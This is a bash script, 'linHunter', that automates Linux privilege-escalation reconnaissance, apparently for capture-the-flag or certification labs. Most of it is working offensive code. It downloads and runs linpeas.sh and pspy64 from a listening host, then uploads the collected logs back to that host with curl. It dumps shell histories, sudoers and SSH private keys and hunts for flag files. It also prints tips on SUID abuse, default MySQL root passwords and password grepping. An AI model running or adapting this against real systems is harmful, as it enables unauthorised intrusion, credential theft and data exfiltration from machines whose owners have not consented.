#!/bin/bash
# 
# Version:              1.3
# linHunter Author:     Mithlonde 
# Last updated:         26/03/2024
# Creation Date:        07/03/2024
# Website:              https://github.com/Mithlonde/Hunter

# Define color and formatting variables
C=$(printf '\033')
WHITE="${C}[1;37m"
YELLOW="${C}[1;33m"
RED="${C}[1;31m"
BLUE="${C}[1;96m"
NC="${C}[0m" # Neutral Color

script_name=$(basename "$0")
output_file_name="$(basename "$script_name" .sh).log"  # Removes .sh extension and appends .log
CWD=$(pwd)
#CWD=$(echo "$PWD" | sed "s|^$HOME|~|") If you want to display it as ~/Home/User/..
echo_command="${RED}$(whoami)@$(hostname)${NC}:${WHITE}${CWD}${NC}\$"

###########################################
#---------------) Header (----------------#
###########################################

echo ""
echo "  _ _                          _             "
echo " | (_)_ __   /\  /\_   _ _ __ | |_ ___ _ __  "
echo " | | | '_ \ / /_/ / | | | '_ \| __/ _ \ '__| "
echo " | | | | | / __  /| |_| | | | | ||  __/ |    "
echo " |_|_|_| |_\/ /_/  \__,_|_| |_|\__\___|_|    " 
echo ""
echo "          Linux PrivEsc Hunter V1.3          "
echo "                by Mithlonde                 "
echo "" 
# https://www.patorjk.com/software/taag/#p=display&f=Ogre&t=linHunter

###########################################
#-------------) Help Legend (-------------#
###########################################

# Download function requires: python3 -m http.server 80
# Upload function requires: python3 -m uploadserver #default port 8000, better to keep it that way

# Function to print help message
print_help() {
    echo -e "Usage: $script_name [OPTIONS]. Skips to manual enumeration if [OPTIONS] are omitted, or only -o is provided"
    echo ""
    echo -e "${WHITE}Options:${NC}"
        echo -e "${YELLOW}  -l <ip>${NC}        Specify IP to download tools from (requires either -http or -smb)"
        echo -e "${YELLOW}  -http${NC}          Use HTTP method upload for file transfer" 
        echo -e "${YELLOW}  -smb${NC}           Use SMB method for file transfer. ${RED}[!] Note: Currently unavailable${NC}"    
        echo -e "${YELLOW}  -o${NC}             Write output to $output_file_name (use 'less -r $log_file' to read)"
        echo -e "${YELLOW}  -tty${NC}           Attempt to spawn a TTY shell ${RED}[!] Note: Currently unavailable${NC}"
        echo -e "${YELLOW}  -c${NC}             Done? Clean up downloaded files and logs"
        echo -e "${YELLOW}  -h${NC}             Display this help message"
        echo ""
        echo -e "${WHITE}Info:${NC} To terminate any background processes started by this script, use the following commands:"
        echo -e "${BLUE}  pkill -f \"pspy64\"${NC}    Terminate pspy64 background process"
        echo -e "${BLUE}  pkill -f \"linpeas\"${NC}   Terminate linpeas background process"
}

###########################################
#----------) Logging Function (-----------#
###########################################

# Function to handle output logging
redirect_output() {
    local log_file="$1"
    # Check if output redirection has already been set
    if [ -z "$output_redirected" ]; then
        if [ -z "$log_file" ]; then
            log_file="$output_file_name"
        fi
        exec > >(tee "$log_file") 2>&1
        # Set the flag to indicate output redirection has been set
        output_redirected=true
        echo -e "${YELLOW}Ouput '-o' option provided, writing output to $log_file${NC}"
        echo -e "Created: ${BLUE}$log_file${NC}"
        echo ""
    fi
}

###########################################
#----------) Cleanup Function (-----------#
###########################################

# Function to handle cleanup
cleanup() {
    echo -e "${YELLOW}[+] ${WHITE}Cleaning up...${NC}"
    deleted_files=("linpeas.sh" "pspy64" "$1")  # Add additional files here if needed
    for file in "${deleted_files[@]}"; do
        if [ -f "$file" ]; then
            rm -f "$file"
            echo -e "Deleted: ${RED}$file${NC}"
        fi
    done

    # Check if logs exists and delete them
    if [ -f "$output_file_name" ]; then
        rm -f "$output_file_name" 
        echo -e "Deleted: ${RED}$output_file_name${NC}"
    fi

    if [ -f "linpeas.log" ]; then
        rm -f "linpeas.log" 
        echo -e "Deleted: ${RED}linpeas.log${NC}"
    fi

    if [ -f "pspy64.log" ]; then
        rm -f "pspy64.log" 
        echo -e "Deleted: ${RED}pspy64.log${NC}"
    fi

    echo -e "${YELLOW}Almost done cleaning up...${NC}"
    # Warn the user about self-destructive action
    echo -e "${RED}[!] WARNING: Deleting $script_name is irreversible!${NC}"

    # Prompt the user about deleting the script itself
    read -p "Do you you want to delete $script_name as well? (y/n): " response
    if [[ $response == "y" ]]; then
        rm -f "$0"
        echo -e "${YELLOW}Done. $script_name deleted${NC}"
    else
        echo -e "${YELLOW}Done. $script_name not deleted${NC}"
    fi
    exit 0
}

###########################################
#---------) Downloader Function (---------#
###########################################

# Function to download tools from the listening host
download_tools() {
    local listening_host="$1"
    local method="$2"

    echo -e "${YELLOW}[+] ${WHITE}Downloading tools from $listening_host using $method...${NC}"

    if [ "$method" == "http" ]; then
        # Attempt to download files using wgetcd te
        if timeout 3 wget -q http://"$listening_host"/linpeas.sh http://"$listening_host"/pspy64; then
            echo -e "$echo_command ${BLUE}wget http://$listening_host/linpeas.sh http://$listening_host/pspy64${NC}"
            echo -e "Downloaded: ${BLUE}linpeas.sh${NC}"
            echo -e "Downloaded: ${BLUE}pspy64${NC}"
            echo "${YELLOW}Files downloaded successfully${NC}"
            echo ""
        else
            # Check if the HTTP server is reachable
            if ! curl -X GET http://"$listening_host"/ping >/dev/null 2>&1; then
                echo -e "${RED}[*] Error: Network is unreachable. Please check your internet connection or HTTP server${NC}"
                exit 1
            else
                # Check if the required files are not found on the server
                if ! wget -q --spider http://"$listening_host"/linpeas.sh http://"$listening_host"/pspy64 >/dev/null 2>&1; then
                    echo -e "${RED}[*] Error: Required files not found on the server${NC}"
                    exit 1
                fi
            fi
        fi
    elif [ "$method" == "smb" ]; then
        #---->NOT IMPLEMENTED TO DUE LACK OF SUDO RIGHTS<----#
        # Add SMB download logic here
        echo "SMB download logic goes here" # Placeholder for actual SMB download commands
        #echo -e "Downloaded: ${BLUE}linpeas.sh${NC}"
        #echo -e "Downloaded: ${BLUE}pspy64${NC}"
        #echo "${YELLOW}[+] ${WHITE}Files downloaded successfully.${NC}"
        echo ""
    else
        echo "${RED}[*] Error: Unsupported file transfer method specified${NC}"
        exit 1
    fi
}

###########################################
#----------) Uploader Function (----------#
###########################################

upload_logs() {
    
    echo -e "${YELLOW}[+] ${WHITE}Uploading logs back to $listening_host using $method...${NC}"
    
    # Check if there are any files to upload
    files_to_upload=("linpeas.log" "pspy64.log" "$output_file_name")
    if [ ${#files_to_upload[@]} -eq 0 ]; then
        echo -e "${RED}[*] Error: No files found to upload${NC}"
        exit 1
    fi

    # Array to store number of (uploaded files/files not found)
    num_uploaded=0
    files_not_found=()

    # Upload each file in the array
    for file in "${files_to_upload[@]}"; do
        # Check if the file exists
        if [ -f "$file" ]; then
            # Attempt to upload files using curl
            if curl -X POST http://"$listening_host":8000/upload -F "files=@$file" 2>/dev/null; then
            echo -e "$echo_command ${BLUE}curl -X POST http://$listening_host:8000/upload -F \"files=@$file\"${NC}"
            echo -e "Uploaded: ${BLUE}$file${NC}"
            ((num_uploaded++))
            fi
        else
            echo -e "Not found: ${RED}$file${NC}"
            files_not_found+=("$file")
        fi
    done

    # Check if the upload server is reachable
    if ! curl -X GET http://"$listening_host":8000/ping >/dev/null 2>&1; then
        echo -e "${RED}[*] Error: Network is unreachable. Please check your internet connection or HTTP upload server${NC}"
        exit 1
    fi

    # Display error message if no files were uploaded and there are files not found
    if [ "$num_uploaded" -eq 0 ] && [ ${#files_not_found[@]} -eq ${#files_to_upload[@]} ]; then
        echo -e "${RED}[*] Error: Network is available, but no files to upload${NC}"
    else
        echo -e "${YELLOW}$num_uploaded File(s) uploaded successfully${NC}"
        echo ""
        echo -e "${RED}[!] Done? Clean up downloaded files and logs from $(hostname) using '$script_name -c'${NC}"
        echo -e "${YELLOW}Happy hunting!${NC}"
    fi        
}

###########################################
#----------) Manual Enumeration (---------#
###########################################

manual_enumeration() {
    start_time=$(date +%s)
    echo -e "${YELLOW}[+] ${WHITE}Performing manual enumeration...${NC}"
    # Checking username and hostname    
    echo -e "$echo_command ${BLUE}whoami ; id ; hostname ; ip a${NC}"
    whoami ; id ; hostname ; ip a
    # Checking for flags (loop)
    flag_files=("user.txt" "root.txt" "local.txt" "proof.txt")
    for file in "${flag_files[@]}"; do
        # Use find to search for the file and store the result in a variable
        result=$(find / -name "$file" 2>/dev/null)
        # Check if any result is found
        if [ -n "$result" ]; then
            echo -e "$echo_command ${BLUE}find / -name $file 2>/dev/null${NC}"
            # Display the full path of the file using pwd and cat
            while IFS= read -r line; do
                echo "$line"
                echo -e "$echo_command ${BLUE}cat $line${NC}"
                cat "$line"
            done <<< "$result"
        fi
    done    
    # Checking operating system, version and architecture
    echo -e "$echo_command ${BLUE}file /bin/bash ; arch ; lsb_release -a ; uname -a ; sudo --version${NC}"
    file /bin/bash ; arch ; lsb_release -a ; uname -a ; sudo --version
    # Checking history privileges
    echo -e "$echo_command ${BLUE}history${NC}"
    cat ~/.bash_history ~/.sh_history ~/.zsh_history
    # Checking additional history 
    echo -e "$echo_command ${BLUE}cat ~/.atftp_history ~/.mysql_history ~/.php_history${NC}"
    cat ~/.atftp_history ~/.mysql_history ~/.php_history
    # Checking privileges
    echo -e "$echo_command ${BLUE}sudo -l -n ; cat /etc/sudoers${NC}"
    sudo -l -n ; cat /etc/sudoers
    # Checking existing users and groups
    echo -e "$echo_command ${BLUE}grep -vE \"nologin|false\" /etc/passwd ; ls -laht /etc/passwd /etc/shadow ; groups $USER${NC}"
    grep -vE "nologin|false" /etc/passwd ; ls -laht /etc/passwd /etc/shadow ; groups $USER
    # Checking home directories
    echo -e "$echo_command ${BLUE}ls -laht /home /root${NC}"
    ls -laht /home /root
    # Checking private-key information
    echo -e "$echo_command ${BLUE}ls -laht ~/.ssh ; cat ~/.ssh/* ; find / -name authorized_keys 2> /dev/null ; find / -name id_rsa 2> /dev/null${NC}"
    ls -laht ~/.ssh ; cat ~/.ssh/* ; find / -name authorized_keys 2> /dev/null ; find / -name id_rsa 2> /dev/null
    echo -e "$echo_command ${BLUE}cat /etc/ssh/*_config${NC}"
    cat /etc/ssh/*_config
    # Checking if SSH directory symlink is possible (Requires cp \* as a backup cronjob)
    echo -e "$echo_command ${BLUE}cat /etc/ssh/*_config | grep 'PermitRoot'${NC}"
    echo -e "${YELLOW}[!] Tip: \"PermitRootLogin without-password\" + cp \\* as a backup cronjob = SSH directory symlink to root${NC}"    
    cat /etc/ssh/*_config | grep 'PermitRoot'
    # Checking SUIDs and GUIDs
    echo -e "$echo_command ${BLUE}find / -perm -u=s -type f 2>/dev/null${NC}"
    echo -e "${YELLOW}[!] Tip: Any vulnerable or custom (use strings!) SUIDs (see https://gtfobins.github.io/)?${NC}"
    find / -perm -u=s -type f 2>/dev/null
    echo -e "$echo_command ${BLUE}find / -perm -g=s -type f 2>/dev/null${NC}"
    echo -e "${YELLOW}[!] Tip: Any vulnerable or custom (use strings!) GUIDs (see https://gtfobins.github.io/)?${NC}"
    find / -perm -g=s -type f 2>/dev/null
    echo -e "$echo_command ${BLUE}getcap -r / 2>/dev/null${NC}"
    echo -e "${YELLOW}[!] Tip: Anything with cap_setuid+ep (see https://gtfobins.github.io/)?${NC}"
    getcap -r / 2>/dev/null
    # Check if netstat is available
    if command -v netstat &>/dev/null; then
        echo -e "$echo_command ${BLUE}netstat -antup${NC}"
        echo -e "${YELLOW}[!] Tip: Anything running locally we can login to? Example: mysql -u root -p (try root/toor/null)${NC}"
        netstat -antup
    else
        ss -tunlp
        echo -e "$echo_command ${BLUE}ss -tunlp${NC}"
        echo -e "${YELLOW}[!] Tip: Anything running locally we can login to? Example: mysql -u root -p (try root/toor/null)${NC}"
    fi
    # Checking website database files
    echo -e "$echo_command ${BLUE}ls -laht /srv /srv/www /var /var/www /var/www/html${NC}"
    echo -e "${YELLOW}[!] Tip: Any web configs containing credentials?${NC}"
    echo "/srv:"
    ls -laht /srv 
    echo ""
    echo "/srv/www:"
    ls -laht /srv/www 
    echo ""
    echo "/var:"
    ls -laht /var
    echo ""
    echo "/var/www:"
    ls -laht /var/www 
    echo ""
    echo "var/www/html:"
    ls -laht /var/www/html
    # Checking other databases
    echo -e "$echo_command ${BLUE}ls -laht /var/lib/pgsql /var/lib/mysql${NC}"
    ls -laht /var/lib/pgsql /var/lib/mysql
    echo -e "$echo_command ${BLUE}dpkg -l | grep -i 'mysql' --colour=auto${NC}"
    echo -e "${YELLOW}[!] Tip: searchsploit mysql <version> linux privilege escalation${NC}"
    dpkg -l | grep -i 'mysql' --colour=auto
    echo -e "$echo_command ${BLUE}ps aux |grep -i 'root' --color=auto${NC}"
    echo -e "${YELLOW}[!] Tip: Is anything vulnerable running as root?${NC}"
    ps aux |grep -i 'root' --color=auto
    # Find Writable Directories
    echo -e "$echo_command ${BLUE}find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null${NC}"
    find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
    # Find Writable Files
    echo -e "$echo_command ${BLUE}find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null${NC}"
    echo -e "${YELLOW}[!] Tip: Any interesting writable files?${NC}"
    find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
    # Checking world writables
    echo -e "$echo_command ${BLUE}ls -laht /opt${NC}"
    echo "/opt:"
    ls -laht /opt
    echo -e "$echo_command ${BLUE}ls -laht /tmp /var/tmp /dev/shm${NC}"
    echo -e "${YELLOW}[!] Tip: Where can I read, write and execute files?${NC}"
    echo "/tmp:"
    ls -laht /tmp
    echo ""
    echo "/var/tmp:"
    ls -laht /var/tmp
    echo ""
    echo "/dev/shm:"
    ls -laht /dev/shm
    # Checking var
    echo -e "$echo_command ${BLUE}ls -laht /var/log ; cat /var/log/auth.log${NC}"
    echo -e "/var/log:"
    ls -laht /var/log ; cat /var/log/auth.log
    echo -e "$echo_command ${BLUE}ls -laht /var/mail /var/spool/mail${NC}"
    echo "/var/mail:"
    ls -laht /var/mail
    echo ""
    echo "/var/spool/mail:"
    ls -laht /var/spool/mail
    # Checking NFS
    echo -e "$echo_command ${BLUE}cat /etc/exports${NC}"
    echo -e "${YELLOW}[!] Tip: NFS? Can we exploit weak NFS Permissions?${NC}"
    cat /etc/exports
    # Checking Cronjobs
    echo -e "$echo_command ${BLUE}cat /etc/crontab ; ls /etc/cron.*${NC}"
    echo -e "${YELLOW}[!] Tip: Check your pspy!${NC}"
    cat /etc/crontab ; ls /etc/cron.*
    # Checking mounts
    echo -e "$echo_command ${BLUE}mount${NC}"
    echo -e "${YELLOW}[!] Tip: How are file-systems mounted?${NC}"
    mount
    echo -e "$echo_command ${BLUE}cat /etc/fstab${NC}"
    echo -e "${YELLOW}[!] Tip: Are there any unmounted file-systems?${NC}"
    cat /etc/fstab
    echo ""
    # Additional checks you can try manually (otherwise it would cause too much cluttered data)
    echo -e "${YELLOW}[+] ${WHITE}Additional checks you can try:${NC}"
    echo -e "${YELLOW}[!] Tip: ${NC}Try ${BLUE}find / -user $USER 2>/dev/null${NC}. Any interesting file(s) $(whoami) has created?${NC}"
    echo -e "${YELLOW}[!] Tip: ${NC}Any interesting folder you think may contain passwords? Try: ${BLUE}grep --color=auto -rnw '/<folder>' -ie 'PASSWORD' --color=always 2> /dev/null${NC}"
    echo -e "${YELLOW}[!] Tip: ${NC}Last but not least, think passwords might be passed around via running processes? Try: ${BLUE}timeout 30 watch -n 1 \"ps -aux | grep pass\"${NC}"
    end_time=$(date +%s)
    duration=$((end_time - start_time))
    minutes=$((duration / 60))
    seconds=$((duration % 60))
    echo ""
    echo -e "${YELLOW}Done. Execution time: $minutes minutes and $seconds seconds${NC}"
    echo ""
}

###########################################
#---------) Auto Enum Function (----------#
###########################################

auto_enum_plus_redirect() {
    # Running auto_enum_plus_redirect (background processes + logs)
    echo -e "${YELLOW}[+] ${WHITE}Performing auto enumeration...${NC}"
    echo -e "${RED}[!] WARNING: Auto enumeration is currently running. Do not cancel!${NC}"
    echo -e "${RED}Cancelling auto enumeration prematurely may leave background processes running (see -h for help)${NC}"
    echo ""

    # Run linpeas.sh in the background and redirect output to linpeas.log
    start_time=$(date +%s)
    echo -e "${YELLOW}[+] ${WHITE}Running linpeas.sh. Please wait ±5 minutes...${NC}"
    echo -e "Ensuring that 'linpeas.sh' is executable..."
    echo -e "$echo_command ${BLUE}chmod +x linpeas.sh${NC}"
    chmod +x linpeas.sh
    echo -e "$echo_command ${BLUE}./linpeas.sh > linpeas.log 2>&1 &${NC}"
    ./linpeas.sh > linpeas.log 2>&1 & 

    # Wait for linpeas.sh to finish
    wait $!
    end_time=$(date +%s)
    duration=$((end_time - start_time))
    minutes=$((duration / 60))
    seconds=$((duration % 60))
    echo -e "Created: ${BLUE}linpeas.log${NC}"
    echo -e "${YELLOW}Done. Execution time: $minutes minutes and $seconds seconds${NC}"
    echo ""

    # Run pspy in the background and redirect output to .pspylog
    start_time=$(date +%s)
    echo -e "${YELLOW}[+] ${WHITE}Running pspy64 and automatically terminates in 5 minutes, please wait...${NC}"
    echo -e "Ensuring that 'pspy64' is executable..."
    echo -e "$echo_command ${BLUE}chmod +x pspy64${NC}"
    chmod +x pspy64
    echo -e "$echo_command ${BLUE}./pspy64 > pspy.log 2>&1 &${NC}"
    ./pspy64 > pspy64.log 2>&1 &
    pspy_pid=$(pgrep -f "pspy64")

    # Sleep for 5 minutes while pspy64 runs 
    sleep 300
    kill $pspy_pid
    end_time=$(date +%s)
    duration=$((end_time - start_time))
    minutes=$((duration / 60))
    seconds=$((duration % 60))
    echo -e "Created: ${BLUE}pspy64.log${NC}"
    echo -e "${YELLOW}Done. Execution time: $minutes minutes and $seconds seconds${NC}"
    echo ""
}

auto_minus_redirect() {
    # Running auto_enum (no background processes, no logs)
    echo -e "${YELLOW}[+] ${WHITE}Performing auto enumeration...${NC}"
        
    # Run linpeas.sh
    start_time=$(date +%s)
    echo -e "${YELLOW}[+] ${WHITE}Running linpeas.sh. Please wait ±5 minutes...${NC}"
    echo -e "Ensuring that 'linpeas.sh' is executable..."
    echo -e "$echo_command ${BLUE}chmod +x linpeas.sh${NC}"
    chmod +x linpeas.sh
    echo -e "$echo_command ${BLUE}./linpeas.sh${NC}"
    ./linpeas.sh

    # Wait for linpeas.sh to finish
    wait $!
    end_time=$(date +%s)
    duration=$((end_time - start_time))
    minutes=$((duration / 60))
    seconds=$((duration % 60))
    echo ""
    echo -e "${YELLOW}Done. Execution time: $minutes minutes and $seconds seconds${NC}"
    echo ""

    # Run pspy
    start_time=$(date +%s)
    echo -e "${YELLOW}[+] ${WHITE}}Running pspy64 and automatically terminates in 5 minutes, please wait...${NC}"
    echo -e "Ensuring that 'pspy64' is executable..."
    echo -e "$echo_command ${BLUE}chmod +x pspy64${NC}"
    chmod +x pspy64
    echo -e "$echo_command ${BLUE}timeout 300 ./pspy64${NC}"
    timeout 300 ./pspy64 # Terminate automatically after 5 minutes

    end_time=$(date +%s)
    duration=$((end_time - start_time))
    minutes=$((duration / 60))
    seconds=$((duration % 60))
    echo ""
    echo -e "${YELLOW}Done. Execution time: $minutes minutes and $seconds seconds${NC}"
    echo ""
}

###########################################
#----------) Parsing Arguments (----------#
###########################################

# Check if any options were provided
if [[ $# -eq 0 ]]; then
    echo -e "${YELLOW}No options provided. Defaulting to manual enumeration (see -h for options)${NC}"
    manual_enumeration
    echo ""
    echo -e "${YELLOW}Happy hunting!${NC}"
    exit 0
fi

# Parse other command-line arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
    -l)
        if [ -z "$2" ]; then
            echo -e "${RED}[*] Error: No listening host IP provided. Usage: -l <lhost-ip> <method>${NC}"
            exit 1
        fi
        listening_host="$2"
        shift 2
        ;;
    -http)
        if [ -n "$method" ]; then
            echo -e "${RED}[*] Error: Specify only one transfer method (-http or -smb)${NC}"
            exit 1
        fi
        method="http"
        shift
        ;;
    -smb)
        if [ -n "$method" ]; then
            echo -e "${RED}[*] Error: Specify only one transfer method (-http or -smb)${NC}"
            exit 1
        fi
        method="smb"
        shift
        ;;
    -o)
        redirect_output "$output_file_name"
        shift
        ;;
    -tty)
        # Add logic to attempt spawning a TTY shell
        echo "Attempting to spawn a TTY shell..."
        shift
        ;;
    -c)
        cleanup
        shift 2
        ;;
    -h)
        print_help
        exit 0
        ;;
    *)
        echo -e "${RED}[*] Error: Invalid option: $1${NC}"
        exit 1
        ;;
    esac
done

# Check if -l and (-http or -smb) are provided, but also -o is provided
if [[ -n "$listening_host" && -n "$method" && "$output_redirected" == true ]]; then
    download_tools "$listening_host" "$method"
    manual_enumeration
    auto_enum_plus_redirect
    upload_logs
    echo ""
    echo -e "${YELLOW}Done. Execution time: $minutes minutes and $seconds seconds${NC}"
    exit 0
fi

# Check if only -l and (-http or -smb) are provided
if [[ -n "$listening_host" && -n "$method" ]]; then
    download_tools "$listening_host" "$method"
    manual_enumeration
    auto_minus_redirect
    echo ""
    echo -e "${YELLOW}Happy hunting!${NC}"
    exit 0
fi

# Check if only -o is provided
if [[ "$output_redirected" == "true" ]]; then
    manual_enumeration
    echo ""
    echo -e "${RED}[!] Done? Clean up downloaded files and logs from $(hostname) using '$script_name -c'${NC}"
    echo -e "${YELLOW}Happy hunting!${NC}"
    exit 0
fi

# Check if listening host IP was provided and (-http or -smb) was specified
if [ -z "$listening_host" ]; then
    echo -e "${RED}[*] Error: No listening host IP provided. Usage: -l <lhost-ip> <method>${NC}"
    exit 1
elif [ -z "$method" ]; then
    echo -e "${RED}[*] Error: Please specify either -http or -smb option. Refer to -h for more info${NC}"
    exit 1
elif [ "$method" != "http" ] && [ "$method" != "smb" ]; then
    echo -e "${RED}[*] Error: Invalid transfer method specified. Please use either -http or -smb option${NC}"
    exit 1
fi
